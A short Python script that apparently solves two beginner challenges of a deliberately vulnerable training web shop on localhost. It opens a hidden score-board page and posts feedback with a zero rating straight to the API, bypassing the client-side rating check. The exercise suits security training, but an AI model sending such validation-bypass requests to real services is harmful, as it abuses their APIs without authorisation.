import pprint
import requests
from data.Strings import star1_complete


url_scoreboard = "http://localhost:3000/#/score-board"

r = requests.get(url=url_scoreboard)
if r.status_code == 200:
    print("[!] Visited score-board page at ../#/score-board")
    print(star1_complete.format("Score Board"))

url = "http://localhost:3000/api/Feedbacks/"

payload = {"captchaId": 9, "captcha": "9", "comment": "Test comment (anonymous)", "rating": 0}
r_2 = requests.post(url=url, data=payload)

if r_2.status_code == 201:
    print("[!] Posted a review with 0-start rating with payload:\n")
    pprint.pprint(r_2.json())
    print(star1_complete.format("Zero Stars"))
